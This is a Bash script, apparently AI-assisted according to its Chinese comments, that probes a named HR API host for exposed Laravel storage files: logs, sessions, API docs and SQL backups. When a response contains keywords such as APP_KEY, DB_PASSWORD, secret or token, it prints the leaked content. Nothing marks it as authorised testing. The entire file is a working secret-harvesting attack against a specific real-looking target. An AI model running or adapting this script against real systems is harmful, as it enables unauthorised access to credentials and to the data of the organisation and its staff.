#!/bin/bash
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 v13.0 /storage/目录直接访问测试（AI建议）"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "[*] AI判断: Laravel路径泄露 /var/www/html/storage/"
echo "[*] 可能存在: /storage/目录可直接访问"
echo ""

TARGET="hrm-api.ghtk.vn"

# AI生成的storage路径
STORAGE_PATHS=(
    # API文档
    "/storage/api-docs/api-docs.json"
    "/var/www/html/storage/api-docs/api-docs.json"
    
    # 日志文件
    "/storage/logs/laravel.log"
    "/storage/logs/laravel-$(date +%Y-%m-%d).log"
    "/storage/logs/laravel-2025-11-13.log"
    "/storage/logs/laravel-2025-11-14.log"
    
    # 会话文件
    "/storage/framework/sessions"
    "/storage/framework/sessions/"
    
    # 缓存
    "/storage/framework/cache"
    "/storage/framework/views"
    
    # 上传文件
    "/storage/app/public"
    "/storage/app/uploads"
    "/public/storage"
    
    # Backup
    "/storage/backups"
    "/storage/backup.sql"
    "/storage/database.sql"
)

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "[*] 开始测试..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

for path in "${STORAGE_PATHS[@]}"; do
    echo -n "  $path → "
    
    resp=$(curl -sk "https://$TARGET$path" -m 2 -w "%{http_code}" -o /tmp/storage_test 2>&1)
    
    if [ "$resp" == "200" ] && [ -s /tmp/storage_test ]; then
        # AI判断是否有价值
        if grep -qiE "APP_KEY|DB_PASSWORD|REDIS|MAIL|password|secret|token|api_key" /tmp/storage_test 2>/dev/null; then
            echo "✅✅✅ 发现敏感信息！"
            echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
            head -50 /tmp/storage_test
            echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
            break
        elif jq -e '.' /tmp/storage_test >/dev/null 2>&1; then
            echo "✅ JSON数据！"
            cat /tmp/storage_test | jq . | head -20
        elif grep -qE "^\[" /tmp/storage_test 2>/dev/null; then
            echo "✅ 日志文件！"
            head -20 /tmp/storage_test
        elif ! grep -q "\"success\":false" /tmp/storage_test 2>/dev/null; then
            echo "⚠️  有内容"
            head -10 /tmp/storage_test
        else
            echo "❌"
        fi
    else
        echo "❌ ($resp)"
    fi
done

